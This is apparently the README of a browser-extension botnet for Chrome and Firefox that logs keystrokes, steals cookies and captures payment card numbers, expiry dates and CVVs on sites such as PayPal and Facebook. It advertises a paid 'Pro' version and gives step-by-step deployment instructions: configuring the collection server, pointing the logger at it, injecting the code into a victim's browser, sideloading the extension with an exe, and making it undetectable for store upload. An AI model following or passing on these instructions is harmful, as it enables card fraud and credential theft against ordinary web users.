# botnet-browser-chrome
botnet browser chrome,mozilla firefox,capture card number any web site ,paypal,facebook,e-commerce ,get card number,expiration date, CVV 

| Name         | Value                  |
| -----------: | :--------------------- |
| Version      |    4 (Free  )          |
| Language     | Javascript, PHP        |
| Keylogger    |  Chrome,Firefox        | 
| Cookies      |   Firefox              |


# Screenshot (older panel )
![1](https://user-images.githubusercontent.com/30985149/76715397-24141180-6724-11ea-8623-21d963a81c92.png)

![2](https://user-images.githubusercontent.com/30985149/76715402-28d8c580-6724-11ea-977b-cccdb0b1e8b3.png)



![card-bot](https://user-images.githubusercontent.com/30985149/76715424-3f7f1c80-6724-11ea-835a-773edb2b24f0.jpg)



# Screenshot (2020 )

![téléchargement (1)](https://user-images.githubusercontent.com/30985149/93617576-0e7eed80-f9ce-11ea-98a6-d169bdf9bf97.jpg)


open log without redirect , remove log very simple

![keylogger](https://user-images.githubusercontent.com/30985149/97839477-3e374a00-1d1d-11eb-9e3a-18aed786b68c.JPG)



| Name         | Value                     | 
| -----------: | :---------------------    |
| Version      |    Pro                    |
| Baypass      |  Chrome and Firefox       |
|exe file to download and install extension|   
                                     
  https://shoppy.gg/product/5d9ifM3    
  
  # Demo Video Facebook : Pro Version
 
Chrome +     https://www.facebook.com/102313318301415/videos/2889519731295268

# Demo video  Facebook : 

  Chrome  +  https://web.facebook.com/102313318301415/videos/651706715777891/


 Firefox  +  https://web.facebook.com/102313318301415/videos/348004879720079/



# Configuration : Server

Start your wampserver,xamp ....etc and send the "server" folder to your server
+ server
1. `config.php`

usernam  = admin

password = admin


# Configuration : extension

inject javascript code into web browser of victime or use extension chrome or mozilla firefox

Open the extension folder js/
+ logger.js
put the name of your website for exemple `http://127.0.0.1
and save changes

+ `background.js`
change "url" redirect after install extension and "url" of cookies


# Exe file to download and Load chrome extension
this exe file can download and load chrome extension without active mode developper for chrome ,see the demo 1

# Installation Manually Chrome / Firefox  :
+ Chrome
1. Open Chrome browser and navigate to `chrome://extensions`
2. Select "Developer Mode" and then click "Load unpacked extension...
3. load folder extension

+ Mozilla Firefox
1. Open Firefox browser and navigate to `about:debugging`
2. Click "Load Temporary Add-on"  
3. click `manifest.json`

 to upload extension in mozilla firefox or chrome web store you need a new version fud  or some technique .



## Contact 

hakanonymos@hotmail.com

Instagram : @hakanonymos


  


